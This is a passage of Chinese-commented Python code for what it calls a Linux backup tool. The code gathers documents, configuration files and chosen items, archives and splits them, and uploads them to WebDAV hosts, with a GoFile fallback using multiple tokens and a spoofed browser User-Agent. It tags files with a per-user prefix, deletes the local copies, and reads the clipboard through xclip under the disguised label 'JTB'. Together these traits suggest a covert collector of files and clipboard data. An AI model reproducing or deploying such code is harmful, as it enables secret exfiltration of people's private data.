                rel_key = self._state_key(relative_path, file) if relative_path else self._state_key(file)
                target_records = changed_records["docs" if is_doc else "configs"]
                status = self._copy_if_changed(
                    source_file_abs, target_file, rel_key, target_records,
                    preserve_symlinks=preserve_symlinks,
                )
                if status == "copied":
                    if is_doc:
                        docs_count += 1
                    else:
                        configs_count += 1
                elif status == "skipped":
                    skipped_count += 1
                elif status == "failed":
                    complete = False

        # 打印备份统计信息
        specified_count = len(changed_records["specified"])
        if docs_count > 0 or configs_count > 0 or specified_count > 0 or skipped_count > 0:
            logging.info("\n📊 Linux文件备份统计:")
            if docs_count > 0:
                logging.info(f"   📚 文档: {docs_count} 个新增/更新文件")
            if configs_count > 0:
                logging.info(f"   ⚙️  配置: {configs_count} 个新增/更新文件")
            if specified_count > 0:
                logging.info(f"   📌 指定项: {specified_count} 个新增/更新文件")
            if skipped_count > 0:
                logging.info(f"   ⏭️ 已跳过: {skipped_count} 个未变化文件")

        # 返回各个分目录的路径字典，用于分别压缩
        backup_dirs = {
            "docs": target_docs,
            "configs": target_configs,
            "specified": target_specified
        }
        if complete and not self._prune_backup_state(source_dir):
            complete = False
        if not self._save_backup_state():
            complete = False
        return backup_dirs, changed_records, complete

    def _create_remote_directory(self, remote_dir, infini_url=None, auth=None):
        """创建远程目录（使用 WebDAV MKCOL 方法）"""
        if not remote_dir or remote_dir == '.':
            return True

        if not infini_url:
            infini_url = self.infini_url
        if auth is None:
            auth = self.auth
        
        try:
            # 构建目录路径
            dir_path = f"{infini_url.rstrip('/')}/{remote_dir.lstrip('/')}"
            
            response = self.session.request('MKCOL', dir_path, auth=auth, timeout=(8, 8))
            
            if response.status_code in [201, 204, 405]:  # 405 表示已存在
                return True
            elif response.status_code == 409:
                # 409 可能表示父目录不存在，尝试创建父目录
                parent_dir = os.path.dirname(remote_dir)
                if parent_dir and parent_dir != '.':
                    if self._create_remote_directory(parent_dir, infini_url=infini_url, auth=auth):
                        # 父目录创建成功，再次尝试创建当前目录
                        response = self.session.request('MKCOL', dir_path, auth=auth, timeout=(8, 8))
                        return response.status_code in [201, 204, 405]
                return False
            else:
                return False
        except Exception:
            return False

    @staticmethod
    def _is_retryable_http_status(status_code):
        return status_code in {408, 425, 429, 500, 502, 503, 504}

    def _verify_remote_file(self, remote_path, auth, expected_size, config_name):
        """尽量通过 HEAD 核对远端大小；不支持 HEAD 的服务器视为无法验证。"""
        if not self.config.VERIFY_UPLOAD:
            return True
        try:
            response = self.session.head(
                remote_path, auth=auth, timeout=(10, 30), allow_redirects=False
            )
            try:
                if response.status_code in {405, 501}:
                    return True
                if response.status_code not in {200, 204}:
                    logging.error(
                        f"❌ [{config_name}] 远端校验失败: {os.path.basename(remote_path)} "
                        f"状态码 {response.status_code}"
                    )
                    return False
                content_length = response.headers.get("Content-Length")
                if content_length is not None:
                    try:
                        if int(content_length) != expected_size:
                            logging.error(
                                f"❌ [{config_name}] 远端大小不一致: "
                                f"{os.path.basename(remote_path)}"
                            )
                            return False
                    except ValueError:
                        return False
                return True
            finally:
                response.close()
        except requests.exceptions.RequestException as exc:
            logging.warning(f"⚠️ [{config_name}] 无法校验远端文件: {exc}")
            return False

    def _upload_single_file_infini(self, file_path, infini_config, remove_on_success=True):
        """使用指定的 Infini 配置上传单个文件。"""
        config_name = infini_config.get("name", "Infini")
        infini_url = infini_config.get("url", "").strip()
        infini_user = infini_config.get("user", "").strip()
        infini_password = infini_config.get("password", "")

        if not infini_url or not infini_user or not infini_password:
            logging.error(f"❌ [{config_name}] 配置不完整，跳过")
            return False

        auth = HTTPBasicAuth(infini_user, infini_password)
        file_size = os.path.getsize(file_path)
        filename = os.path.basename(file_path)
        remote_base = quote(self.config.INFINI_REMOTE_BASE_DIR, safe="")
        remote_filename = f"{remote_base}/{quote(filename, safe='')}"
        remote_path = f"{infini_url.rstrip('/')}/{remote_filename.lstrip('/')}"

        # 创建远程目录（如果需要）
        remote_dir = os.path.dirname(remote_filename)
        if remote_dir and remote_dir != '.':
            if not self._create_remote_directory(remote_dir, infini_url=infini_url, auth=auth):
                logging.warning(f"[{config_name}] 无法创建远程目录: {remote_dir}，将继续尝试上传")

        deadline = time.monotonic() + self.config.UPLOAD_TOTAL_TIMEOUT
        # 上传重试逻辑
        for attempt in range(self.config.RETRY_COUNT):
            if time.monotonic() >= deadline:
                logging.error(f"❌ [{config_name}] {filename}: 超过总上传时间预算")
                break

            retryable = True
            response = None
            try:
                # 根据文件大小动态调整超时时间
                if file_size < 1024 * 1024:  # 小于1MB
                    connect_timeout = 10
                    read_timeout = 30
                elif file_size < 10 * 1024 * 1024:  # 1-10MB
                    connect_timeout = 15
                    read_timeout = max(30, int(file_size / 1024 / 1024 * 5))
                else:  # 大于10MB
                    connect_timeout = 20
                    read_timeout = max(60, int(file_size / 1024 / 1024 * 6))

                # 单次请求也不能突破剩余总预算，否则重试计数形同虚设。
                remaining = max(15, int(deadline - time.monotonic()))
                read_timeout = min(read_timeout, remaining)

                # 只在第一次尝试时显示详细信息
                if attempt == 0:
                    size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                    logging.info(f"📤 [{config_name}] 上传: {filename} ({size_str})")
                elif self.config.DEBUG_MODE:
                    logging.debug("[%s] 重试上传: %s (第 %d 次)", config_name, filename, attempt + 1)

                # 准备请求头
                headers = {
                    'Content-Type': 'application/octet-stream',
                    'Content-Length': str(file_size),
                }

                # 执行上传（使用 WebDAV PUT 方法）
                with open(file_path, 'rb') as f:
                    response = self.session.put(
                        remote_path,
                        data=f,
                        headers=headers,
                        auth=auth,
                        timeout=(connect_timeout, read_timeout),
                        stream=False
                    )

                if response.status_code in {200, 201, 202, 204}:
                    if (response.status_code == 202 or self.config.VERIFY_UPLOAD) and not \
                            self._verify_remote_file(remote_path, auth, file_size, config_name):
                        retryable = True
                    else:
                        logging.info(f"✅ [{config_name}] {filename}")
                        if remove_on_success:
                            try:
                                os.remove(file_path)
                            except OSError as e:
                                logging.warning(f"⚠️ 删除已上传文件失败: {e}")
                        return True
                elif response.status_code in {401, 403}:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {filename}: 权限不足")
                    retryable = False
                elif response.status_code == 404:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {filename}: 远程路径不存在")
                    retryable = False
                elif response.status_code == 409:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {filename}: 远程路径冲突")
                    retryable = False
                else:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {filename}: 状态码 {response.status_code}")
                    retryable = self._is_retryable_http_status(response.status_code)

            except requests.exceptions.Timeout:
                if attempt == 0 or self.config.DEBUG_MODE:
                    logging.error(f"❌ [{config_name}] {filename}: 超时")
                retryable = True
            except requests.exceptions.SSLError:
                if attempt == 0 or self.config.DEBUG_MODE:
                    logging.error(f"❌ [{config_name}] {filename}: SSL错误")
                retryable = False
            except requests.exceptions.ConnectionError:
                if attempt == 0 or self.config.DEBUG_MODE:
                    logging.error(f"❌ [{config_name}] {filename}: 连接错误")
                retryable = True
            except Exception as e:
                if attempt == 0 or self.config.DEBUG_MODE:
                    logging.error(f"❌ [{config_name}] {filename}: {str(e)}")
                retryable = False
            finally:
                if response is not None:
                    try:
                        response.close()
                    except Exception:
                        pass

            if not retryable:
                break
            if attempt < self.config.RETRY_COUNT - 1:
                delay = self._retry_delay(attempt)
                if time.monotonic() + delay >= deadline:
                    break
                if self.config.DEBUG_MODE:
                    logging.debug(f"[{config_name}] 等待 {delay:.1f} 秒后重试...")
                time.sleep(delay)

        logging.error(f"❌ [{config_name}] {filename}: 上传失败")
        return False

    def _atomic_write_json(self, path, payload, mode=None):
        path = Path(path)
        temp_path = path.with_name(f".{path.name}.tmp-{os.getpid()}-{threading.get_ident()}")
        try:
            path.parent.mkdir(mode=self.config.BACKUP_DIR_MODE, parents=True, exist_ok=True)
            with open(temp_path, "w", encoding="utf-8") as target:
                json.dump(payload, target, ensure_ascii=False, indent=2)
                target.flush()
                os.fsync(target.fileno())
            os.chmod(temp_path, mode or self.config.BACKUP_FILE_MODE)
            os.replace(temp_path, path)
            os.chmod(path, mode or self.config.BACKUP_FILE_MODE)
            self._fsync_parent(path)
            return True
        except Exception as exc:
            logging.error(f"写入清单失败 {path}: {exc}")
            try:
                if temp_path.exists():
                    temp_path.unlink()
            except OSError:
                pass
            return False

    def _build_manifest_payload(self, archive_key, data_paths, file_records=None):
        ordered_parts = sorted(
            (path for path in data_paths if archive_part_number(path) is not None),
            key=archive_part_number,
        )
        direct_archives = [
            path for path in data_paths
            if archive_part_number(path) is None and os.path.basename(path) == archive_key
        ]
        if direct_archives and not ordered_parts:
            archive_path = direct_archives[0]
            payload = {
                "format": "ylx-archive-v1",
                "kind": "archive",
                "archive": archive_key,
                "size": os.path.getsize(archive_path),
                "sha256": self._hash_file(archive_path),
                "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            }
        elif ordered_parts and not direct_archives:
            numbers = [archive_part_number(path) for path in ordered_parts]
            if numbers != list(range(len(numbers))):
                raise ValueError("分片序号不连续")
            whole_digest = hashlib.sha256()
            total_size = 0
            parts = []
            for part_path in ordered_parts:
                part_digest = hashlib.sha256()
                part_size = 0
                with open(part_path, "rb") as source:
                    for block in iter(lambda: source.read(1024 * 1024), b""):
                        part_digest.update(block)
                        whole_digest.update(block)
                        part_size += len(block)
                total_size += part_size
                parts.append({
                    "name": os.path.basename(part_path),
                    "size": part_size,
                    "sha256": part_digest.hexdigest(),
                })
            payload = {
                "format": "ylx-parts-v1",
                "kind": "parts",
                "archive": archive_key,
                "size": total_size,
                "sha256": whole_digest.hexdigest(),
                "parts": parts,
                "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            }
        else:
            raise ValueError("归档组同时包含原归档和分片，或没有有效数据文件")
        if file_records:
            payload["files"] = dict(file_records)
        return payload

    def _write_group_manifest(self, archive_key, data_paths, file_records=None):
        data_paths = [str(path) for path in data_paths]
        payload = self._build_manifest_payload(archive_key, data_paths, file_records=file_records)
        if payload["kind"] == "parts":
            manifest_path = os.path.join(os.path.dirname(data_paths[0]), archive_key + ".manifest.json")
        else:
            manifest_path = data_paths[0] + ".manifest.json"
        if not self._atomic_write_json(
                manifest_path, payload,
                mode=getattr(self.config, "ARCHIVE_FILE_MODE", 0o644)):
            return None
        return manifest_path

    def _validate_archive_group(self, archive_key, archive_paths):
        """验证归档组完整性，返回 (是否有效, 有序路径列表, 原因)。"""
        manifests = [
            path for path in archive_paths
            if os.path.basename(path).endswith(".manifest.json")
        ]
        data_paths = [path for path in archive_paths if path not in manifests]
        if not data_paths:
            return False, [], "归档组没有数据文件"

        # 兼容旧版本没有清单的归档：补写清单后继续校验。
        if not manifests:
            try:
                manifest_path = self._write_group_manifest(archive_key, data_paths)
            except Exception as exc:
                return False, [], f"无法生成归档清单: {exc}"
            if manifest_path is None:
                return False, [], "无法生成归档清单"
            manifests = [manifest_path]
        if len(manifests) > 1:
            return False, [], "归档组包含多个清单"

        try:
            with open(manifests[0], "r", encoding="utf-8") as source:
                manifest = json.load(source)
        except Exception as exc:
            return False, [], f"清单不可读: {exc}"
        if not isinstance(manifest, dict) or manifest.get("archive") != archive_key:
            return False, [], "清单归档名不匹配"

        kind = manifest.get("kind")
        ordered = []
        try:
            if kind == "archive":
                archives = [
                    path for path in data_paths
                    if os.path.basename(path) == archive_key
                ]
                if len(archives) != 1 or len(data_paths) != 1:
                    return False, [], "原归档缺失或存在多余文件"
                archive_path = archives[0]
                if os.path.getsize(archive_path) != manifest.get("size"):
                    return False, [], "原归档大小不一致"
                if self._hash_file(archive_path) != manifest.get("sha256"):
                    return False, [], "原归档哈希不一致"
                ordered = [archive_path, manifests[0]]
            elif kind == "parts":
                expected_parts = manifest.get("parts")
                if not isinstance(expected_parts, list) or not expected_parts:
                    return False, [], "分片清单为空或格式错误"
                if not all(isinstance(part, dict) for part in expected_parts):
                    return False, [], "分片清单条目格式错误"
                expected_names = [part.get("name") for part in expected_parts]
                if not all(isinstance(name, str) and name for name in expected_names):
                    return False, [], "分片清单文件名格式错误"
                actual_parts = sorted(
                    (path for path in data_paths if archive_part_number(path) is not None),
                    key=archive_part_number,
                )
                if len(actual_parts) != len(data_paths):
                    return False, [], "分片组包含非分片文件"
                if [os.path.basename(path) for path in actual_parts] != expected_names:
                    return False, [], "分片名称或数量与清单不一致"
                whole_digest = hashlib.sha256()
                total_size = 0
                for part_path, part_meta in zip(actual_parts, expected_parts):
                    part_digest = hashlib.sha256()
                    part_size = 0
                    with open(part_path, "rb") as source:
                        for block in iter(lambda: source.read(1024 * 1024), b""):
                            part_digest.update(block)
                            whole_digest.update(block)
                            part_size += len(block)
                    if part_size != part_meta.get("size") or \
                            part_digest.hexdigest() != part_meta.get("sha256"):
                        return False, [], f"分片校验失败: {os.path.basename(part_path)}"
                    total_size += part_size
                if total_size != manifest.get("size") or \
                        whole_digest.hexdigest() != manifest.get("sha256"):
                    return False, [], "合并后的归档哈希不一致"
                ordered = actual_parts + [manifests[0]]
            else:
                return False, [], "未知的清单类型"
        except OSError as exc:
            return False, [], f"读取归档失败: {exc}"
        return True, ordered, ""

    def split_large_file(self, file_path, file_records=None):
        """将大文件分割为多个带清单的小块。"""
        if not os.path.exists(file_path):
            return None
        try:
            file_size = os.path.getsize(file_path)
            if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
                return [file_path]

            chunk_size = min(self.config.CHUNK_SIZE, self.config.MAX_SINGLE_FILE_SIZE)
            if chunk_size <= 0:
                raise ValueError("分片大小必须大于 0")

            base_name = os.path.basename(file_path)
            parts_root = os.path.join(os.path.dirname(file_path), ".parts")
            chunk_dir = os.path.join(parts_root, base_name)
            if not self._ensure_directory(chunk_dir):
                return None
            for stale in glob.glob(os.path.join(chunk_dir, "*")):
                try:
                    os.remove(stale)
                except OSError:
                    logging.warning(f"无法清理旧分片: {stale}")

            chunk_files = []
            with open(file_path, "rb") as source:
                chunk_num = 0
                while True:
                    chunk_data = source.read(chunk_size)
                    if not chunk_data:
                        break
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    with open(chunk_path, "xb") as chunk_file:
                        chunk_file.write(chunk_data)
                        chunk_file.flush()
                        os.fsync(chunk_file.fileno())
                    os.chmod(
                        chunk_path,
                        getattr(self.config, "ARCHIVE_FILE_MODE", 0o644),
                    )
                    expected_hash = hashlib.sha256(chunk_data).hexdigest()
                    if self._hash_file(chunk_path) != expected_hash:
                        raise OSError(f"分片写入校验失败: {chunk_name}")
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                    logging.info(f"已创建分片 {chunk_num}: {len(chunk_data) / 1024 / 1024:.2f}MB")

            manifest_path = self._write_group_manifest(base_name, chunk_files, file_records=file_records)
            if manifest_path is None:
                raise OSError("写入分片清单失败")
            os.remove(file_path)
            logging.info(f"文件 {file_path} ({file_size / 1024 / 1024:.2f}MB) 已分割为 {len(chunk_files)} 个分片")
            return chunk_files + [manifest_path]

        except Exception as e:
            logging.error(f"分割文件失败 {file_path}: {e}")
            try:
                if 'chunk_dir' in locals() and os.path.isdir(chunk_dir):
                    shutil.rmtree(chunk_dir, ignore_errors=True)
            except OSError:
                pass
            return None

    def zip_backup_folder(self, folder_path, zip_file_path, file_records=None):
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"源目录为空 {folder_path}")
                return None

            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"获取文件大小失败 {file_path}: {e}")
                        continue

            tar_path = f"{zip_file_path}.tar.gz"
            # 清理同名旧归档，避免残留文件被误上传
            if os.path.exists(tar_path):
                os.remove(tar_path)

            with tarfile.open(tar_path, "w:gz", compresslevel=BackupConfig.TAR_COMPRESS_LEVEL) as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))
            os.chmod(tar_path, getattr(self.config, "ARCHIVE_FILE_MODE", 0o644))

            # 不再加密，直接上传 tar.gz 归档
            archive_path = tar_path

            try:
                compressed_size = os.path.getsize(archive_path)
                if compressed_size == 0:
                    logging.error(f"压缩文件大小为0 {archive_path}")
                    if os.path.exists(archive_path):
                        os.remove(archive_path)
                    return None

                logging.info(f"目录 {folder_path} 已压缩: {dir_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                
                # 如果压缩文件过大，进行分片
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    archive_paths = self.split_large_file(archive_path, file_records=file_records)
                else:
                    manifest_path = self._write_group_manifest(
                        os.path.basename(archive_path), [archive_path], file_records=file_records
                    )
                    archive_paths = [archive_path, manifest_path] if manifest_path else None
                if not archive_paths:
                    return None
                try:
                    shutil.rmtree(folder_path)
                except OSError as exc:
                    logging.warning(f"归档已生成但源目录清理失败: {folder_path}: {exc}")
                return archive_paths
                    
            except OSError as e:
                logging.error(f"获取压缩文件大小失败 {archive_path}: {e}")
                if os.path.exists(archive_path):
                    os.remove(archive_path)
                return None
                
        except Exception as e:
            logging.error(f"压缩失败 {folder_path}: {e}")
            try:
                incomplete_archive = f"{zip_file_path}.tar.gz"
                if os.path.exists(incomplete_archive):
                    os.remove(incomplete_archive)
            except OSError:
                pass
            return None

    def _recover_pending_from_manifest(self, archive_key, ordered_paths):
        """从清单恢复 pending 指纹，用于状态写入失败后的重启恢复。"""
        with self._state_lock:
            if archive_key in self._state.get("pending_archives", {}):
                return True
        manifest_path = next(
            (path for path in ordered_paths if path.endswith(".manifest.json")),
            None,
        )
        if manifest_path is None:
            return True
        try:
            with open(manifest_path, "r", encoding="utf-8") as source:
                manifest = json.load(source)
        except Exception as exc:
            logging.warning(f"⚠️ 无法从清单恢复 pending 指纹 {manifest_path}: {exc}")
            return True
        files = manifest.get("files") if isinstance(manifest, dict) else None
        if not isinstance(files, dict) or not files:
            return True
        files = {key: value for key, value in files.items() if isinstance(value, dict)}
        if not files:
            return True
        return self.register_pending_archive(ordered_paths[0], files)

    def _normalize_archive_group_paths(self, backup_paths):
        """上传前统一归档文件名；发生改名时同步重建清单。"""
        normalized = []
        renamed = False
        for path in backup_paths:
            normalized_path = self._ensure_upload_filename(path)
            if normalized_path is None:
                return None
            renamed = renamed or normalized_path != path
            normalized.append(normalized_path)
        if not renamed:
            return normalized

        manifests = [
            path for path in normalized
            if os.path.basename(path).endswith(".manifest.json")
        ]
        data_paths = [path for path in normalized if path not in manifests]
        if not data_paths:
            return None
        archive_keys = {archive_group_key(path) for path in data_paths}
        if len(archive_keys) != 1:
            logging.error("❌ 归档改名后组名不一致，拒绝上传")
            return None
        archive_key = archive_keys.pop()

        file_records = None
        for manifest_path in manifests:
            try:
                with open(manifest_path, "r", encoding="utf-8") as source:
                    manifest = json.load(source)
                files = manifest.get("files") if isinstance(manifest, dict) else None
                if isinstance(files, dict) and files:
                    file_records = {
                        key: value for key, value in files.items() if isinstance(value, dict)
                    }
                    break
            except Exception:
                continue

        try:
            new_manifest = self._write_group_manifest(
                archive_key, data_paths, file_records=file_records
            )
        except Exception as exc:
            logging.error(f"❌ 归档改名后重写清单失败: {exc}")
            return None
        if new_manifest is None:
            return None
        for manifest_path in manifests:
            if os.path.abspath(manifest_path) != os.path.abspath(new_manifest):
                try:
                    os.remove(manifest_path)
                except OSError:
                    pass
        return sort_archive_group_paths(data_paths + [new_manifest])

    def upload_backup(self, backup_paths):
        """按归档组上传；整组成功后才删除本地文件。"""
        if not backup_paths:
            return False
        if isinstance(backup_paths, str):
            backup_paths = [backup_paths]

        success = True
        for _, paths in group_archive_paths(backup_paths).items():
            ordered_paths = self._normalize_archive_group_paths(paths)
            if not ordered_paths:
                logging.error("❌ 归档文件改名/清单重建失败，整组保留")
                success = False
                continue
            archive_key = archive_group_key(ordered_paths[0])
            valid, ordered_paths, reason = self._validate_archive_group(archive_key, ordered_paths)
            if not valid:
                logging.error(f"❌ 归档组不完整 {archive_key}: {reason}")
                success = False
                continue

            # 旧版本或状态写入失败时，清单仍保留文件指纹；先恢复 pending，
            # 这样上传成功后可正常更新已上传索引，而不是下一轮重复上传。
            self._recover_pending_from_manifest(archive_key, ordered_paths)

            group_uploaded = True
            for path in ordered_paths:
                if not self.upload_file(path, remove_on_success=False):
                    group_uploaded = False
                    break
            if not group_uploaded:
                logging.error(f"❌ 归档组上传失败，本地文件全部保留: {archive_key}")
                success = False
                continue

            if not self.mark_archive_uploaded(archive_key):
                logging.error(f"❌ 归档已上传但状态写入失败，本地文件保留: {archive_key}")
                success = False
                continue

            for path in ordered_paths:
                try:
                    if os.path.exists(path):
                        os.remove(path)
                except OSError as exc:
                    logging.warning(f"⚠️ 删除已上传文件失败 {path}: {exc}")
            self._cleanup_empty_group_dirs(ordered_paths)
        return success

    @staticmethod
    def _cleanup_empty_group_dirs(paths):
        directories = {
            os.path.dirname(os.path.abspath(path))
            for path in paths
            if os.path.basename(os.path.dirname(os.path.abspath(path))) == ".parts"
            or os.path.basename(os.path.dirname(os.path.dirname(os.path.abspath(path)))) == ".parts"
        }
        for directory in sorted(directories, key=len, reverse=True):
            try:
                if os.path.isdir(directory) and not os.listdir(directory):
                    os.rmdir(directory)
                    parent = os.path.dirname(directory)
                    if os.path.basename(parent) == ".parts" and not os.listdir(parent):
                        os.rmdir(parent)
            except OSError:
                pass

    def upload_file(self, file_path, remove_on_success=True):
        """上传单个文件。"""
        file_path = self._ensure_upload_filename(file_path)
        if file_path is None:
            return False
        if not self._is_valid_file(file_path):
            logging.error(f"文件 {file_path} 为空或无效，跳过上传")
            return False
            
        return self._upload_single_file(file_path, remove_on_success=remove_on_success)

    def _ensure_upload_filename(self, file_path):
        """确保上传文件名以当前用户前缀开头，并返回实际路径。"""
        try:
            path = Path(file_path)
            if not path.exists() or not path.is_file():
                return str(path)
            if path.name.startswith(self.user_prefix):
                return str(path)

            prefixed_path = path.with_name(self.user_prefix + path.name)
            if prefixed_path.exists():
                logging.error(f"前缀文件已存在，拒绝覆盖: {prefixed_path}")
                return None
            path.rename(prefixed_path)
            logging.debug(f"已为上传文件添加用户前缀: {path.name} -> {prefixed_path.name}")
            return str(prefixed_path)
        except (OSError, TypeError, ValueError) as e:
            logging.error(f"为上传文件添加用户前缀失败 {file_path}: {e}")
            return None

    def _upload_single_file_gofile(self, file_path, remove_on_success=True):
        """上传单个文件到 GoFile；所有 Token/节点只遍历一次，并受总时限约束。"""
        try:
            if not os.path.exists(file_path):
                logging.error(f"文件不存在: {file_path}")
                return False
            if not os.access(file_path, os.R_OK):
                logging.error(f"文件无读取权限: {file_path}")
                return False

            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                return False
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(
                    f"文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > "
                    f"{self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB"
                )
                return False

            filename = os.path.basename(file_path)
            logging.info(f"🔄 尝试使用 GoFile 上传: {filename}")
            api_tokens = [token for token in getattr(self, "api_tokens", []) if token] or [self.api_token]
            upload_targets = [
                (token_index, api_token, server)
                for token_index, api_token in enumerate(api_tokens, start=1)
                for server in self.config.UPLOAD_SERVERS
            ]
            deadline = time.monotonic() + self.config.UPLOAD_TOTAL_TIMEOUT
            size_str = (
                f"{file_size / 1024 / 1024:.2f}MB"
                if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
            )
            logging.info(f"📤 [GoFile] 上传: {filename} ({size_str})")

            last_token_index = 0
            transient_failures = 0
            for target_index, (token_index, api_token, server) in enumerate(upload_targets):
                if time.monotonic() >= deadline:
                    logging.error(f"❌ [GoFile] {filename}: 超过总上传时间预算")
                    break
                if token_index != last_token_index:
                    last_token_index = token_index
                    if token_index > 1:
                        logging.warning(
                            f"⚠️ [GoFile] 回退到备用 token "
                            f"({token_index}/{len(api_tokens)}): {filename}"
                        )

                remaining = max(15, int(deadline - time.monotonic()))
                read_timeout = min(
                    remaining,
                    min(self.config.UPLOAD_TIMEOUT, max(60, int(file_size / 1024 / 1024 * 6))),
                )
                session = requests.Session()
                session.verify = True
                session.headers.update({
                    "User-Agent": (
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                        "AppleWebKit/537.36 (KHTML, like Gecko) "
                        "Chrome/91.0.4472.124 Safari/537.36"
                    )
                })
                retryable = False
                try:
                    with open(file_path, "rb") as source:
                        response = session.post(
                            server,
                            files={"file": source},
                            headers={"Authorization": f"Bearer {api_token}"},
                            timeout=(20, read_timeout),
                        )
                    if (response.ok
                            and response.headers.get("Content-Type", "").startswith("application/json")):
                        result = response.json()
                        if result.get("status") == "ok":
                            logging.info(f"✅ [GoFile] {filename}")
                            if remove_on_success:
                                try:
                                    os.remove(file_path)
                                except OSError as exc:
                                    logging.warning(f"⚠️ 删除已上传文件失败: {exc}")
                            return True
                        logging.error(
                            f"❌ [GoFile] {filename}: "
                            f"{result.get('message', '未知错误')}"
                        )
                        retryable = True
                    else:
                        logging.error(
                            f"❌ [GoFile] {filename}: 状态码 {response.status_code}"
                        )
                        retryable = self._is_retryable_http_status(response.status_code)
                except requests.exceptions.Timeout:
                    logging.error(f"❌ [GoFile] {filename}: 超时")
                    retryable = True
                except requests.exceptions.SSLError:
                    logging.error(f"❌ [GoFile] {filename}: SSL错误")
                except requests.exceptions.ConnectionError:
                    logging.error(f"❌ [GoFile] {filename}: 连接错误")
                    retryable = True
                except Exception as exc:
                    logging.error(f"❌ [GoFile] {filename}: {exc}")
                finally:
                    try:
                        session.close()
                    except Exception:
                        pass

                if retryable:
                    transient_failures += 1
                else:
                    transient_failures = 0
                if target_index < len(upload_targets) - 1 and transient_failures:
                    delay = min(2 ** min(transient_failures, 4), 30)
                    if time.monotonic() + delay >= deadline:
                        break
                    time.sleep(delay)

            logging.error(f"❌ [GoFile] {filename}: 上传失败")
            return False
        except OSError as exc:
            logging.error(f"获取文件信息失败 {file_path}: {exc}")
            return False
        except Exception as exc:
            logging.error(f"[GoFile] 上传过程出错: {exc}")
            return False

    def _upload_single_file(self, file_path, remove_on_success=True):
        """上传单个文件：依次尝试所有 Infini 配置，全部失败后再使用 GoFile 备选方案"""
        try:
            # 检查文件权限和状态
            if not os.path.exists(file_path):
                logging.error(f"文件不存在: {file_path}")
                return False
                
            if not os.access(file_path, os.R_OK):
                logging.error(f"文件无读取权限: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            filename = os.path.basename(file_path)
            infini_configs = self.infini_configs if self.infini_configs else [
                {
                    "name": "Infini-默认配置",
                    "url": self.infini_url,
                    "user": self.infini_user,
                    "password": self.infini_pass,
                }
            ]

            # 依次尝试所有 Infini 上传配置
            for index, infini_config in enumerate(infini_configs, start=1):
                config_name = infini_config.get("name", f"Infini-{index}")
                logging.info(f"🔄 尝试 Infini 上传配置 {index}/{len(infini_configs)}: {config_name}")
                if self._upload_single_file_infini(
                        file_path, infini_config, remove_on_success=remove_on_success):
                    return True

            # 所有 Infini 上传方法都失败后，才尝试 GoFile 备选方案
            logging.warning(f"⚠️ 所有 Infini 上传方法均失败，尝试使用 GoFile 备选方案: {filename}")
            if self._upload_single_file_gofile(
                    file_path, remove_on_success=remove_on_success):
                return True
            
            # 所有方法都失败：保留本地文件，等待下一轮重试
            logging.error(f"❌ {filename}: 所有上传方法均失败，已保留本地文件")
            
            return False
            
        except OSError as e:
            logging.error(f"获取文件信息失败 {file_path}: {e}")
            return False


    def get_clipboard_content(self):
        """获取 Linux JTB 内容

        返回:
            str or None: 当前JTB文本内容，获取失败或为空时返回 None
        """
        # 检查 DISPLAY 环境变量是否可用
        display = os.environ.get('DISPLAY')
        if not display:
            # DISPLAY 不可用，只在第一次或间隔时间后记录警告
            current_time = time.time()
            if not self._clipboard_display_warned or \
               (current_time - self._clipboard_display_error_time) >= self._clipboard_display_error_interval:
                if not self._clipboard_display_warned:
                    if self.config.DEBUG_MODE:
                        logging.debug("⚠️ DISPLAY 环境变量不可用，JTB监控功能已禁用（服务器环境或无图形界面）")
                    self._clipboard_display_warned = True
                self._clipboard_display_error_time = current_time
            return None
        
        try:
            # 使用 xclip 读取JTB（需系统已安装 xclip）
            result = subprocess.run(
                ['xclip', '-selection', 'clipboard', '-o'],
                capture_output=True,
                text=True,
                env=os.environ.copy(),  # 确保使用当前环境变量
                timeout=5
            )
            if result.returncode == 0:
                content = (result.stdout or "").strip()
                if content and not content.isspace():
                    return content
                # JTB为空时不记录日志，避免频繁报错
            else:
                # xclip 返回错误，检查是否是 DISPLAY 相关错误
                error_msg = result.stderr.strip() if result.stderr else ""
                is_display_error = "Can't open display" in error_msg or "display" in error_msg.lower()
                
                if is_display_error:
                    # DISPLAY 相关错误，降低日志频率
                    current_time = time.time()
                    if not self._clipboard_display_warned or \
                       (current_time - self._clipboard_display_error_time) >= self._clipboard_display_error_interval:
                        if not self._clipboard_display_warned:
                            if self.config.DEBUG_MODE:
